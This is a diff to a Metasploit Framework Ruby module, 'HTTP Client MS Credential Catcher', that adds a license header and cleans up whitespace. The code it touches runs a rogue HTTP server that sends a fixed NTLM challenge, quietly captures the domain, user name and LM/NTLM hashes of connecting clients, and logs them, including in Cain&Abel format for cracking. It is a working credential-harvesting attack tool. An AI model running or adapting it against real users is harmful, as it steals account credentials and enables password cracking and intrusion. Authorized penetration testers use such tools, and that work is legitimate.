@@ -1,3 +1,14 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
 require 'msf/core'
 require 'rex/proto/smb/utils'
 require 'rex/proto/smb/constants'
@@ -10,15 +21,15 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpServer::HTML
 	include Msf::Auxiliary::Report
-	
+
 	def initialize(info = {})
-		super(update_info(info, 
+		super(update_info(info,
 			'Name'        => 'HTTP Client MS Credential Catcher',
 			'Version'     => '$$',
 			'Description' => %q{
 					This module attempts to quietly catch NTLM/LM Challenge hashes.
 				},
-			'Author'      => 
+			'Author'      =>
 				[
 					'Ryan Linn <sussurro[at]happypacket.net>',
 				],
@@ -27,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 				 	[ 'WebServer' ]
 				],
-			'PassiveActions' => 
+			'PassiveActions' =>
 				[
 					'WebServer'
 				],
@@ -36,7 +47,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options([
 			OptString.new('LOGFILE', [ false, "The local filename to store the captured hashes", nil ]),
 			OptString.new('PWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ])
-		
+
 		], self.class)
 		register_advanced_options([
 			OptString.new('DOMAIN',  [ false, "The default domain to use for NTLM authentication", "DOMAIN"]),
@@ -45,12 +56,12 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('DNSDOMAIN',  [ false, "The default DNS domain name to use for NTLM authentication", "example.com"]),
 			OptBool.new('FORCEDEFAULT',  [ false, "Force the default settings", false])
 		], self.class)
-		
+
 		@challenge = "\x11\x22\x33\x44\x55\x66\x77\x88"
 
 	end
-	
-	def on_request_uri(cli, request) 
+
+	def on_request_uri(cli, request)
 		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
 		case request.uri
 			when %r{^#{datastore['URIPATH']}.*sessid=}
@@ -108,13 +119,13 @@ class Metasploit3 < Msf::Auxiliary
 			chalhash = UTILS.process_type1_message(hash,@challenge,domain,server,dnsname,dnsdomain)
 			response.headers['WWW-Authenticate'] = "NTLM " + chalhash
 			return response
-		
+
 		#if the message is a type 3 message, then we have our creds
 		elsif(message[8] == 0x03)
 			domain,user,host,lm_hash,ntlm_hash = UTILS.process_type3_message(hash)
 			print_status("#{cli.peerhost}: #{domain}\\#{user} #{lm_hash}:#{ntlm_hash} on #{host}")
-		
-			if(datastore['LOGFILE'])			
+
+			if(datastore['LOGFILE'])
 				fd = File.open(datastore['LOGFILE'], "a")
 				fd.puts(
 					[
@@ -129,7 +140,7 @@ class Metasploit3 < Msf::Auxiliary
 				)
 				fd.close
 			end
-					
+
 			if(datastore['PWFILE'] and user and lm_hash)
 				fd = File.open(datastore['PWFILE'], "a+")
 				fd.puts(
@@ -141,8 +152,8 @@ class Metasploit3 < Msf::Auxiliary
 						ntlm_hash ? ntlm_hash : "0" * 32
 					].join(":").gsub(/\n/, "\\n")
 				)
-				fd.close		
-			
+				fd.close
+
 			end
 			response = create_response(200)
 			return response
@@ -152,11 +163,11 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 	end
-	
+
 	def parse_type1_domain(message)
 		domain = nil
 		workstation = nil
-		
+
 		reqflags = message[12..15]
 		reqflags = Integer("0x" + reqflags.unpack("h8").to_s.reverse)
 
@@ -171,7 +182,7 @@ class Metasploit3 < Msf::Auxiliary
 			workstation = message[wor_off,wor_len].to_s
 		end
 		return domain,workstation
-	
+
 	end
-		
+
 end
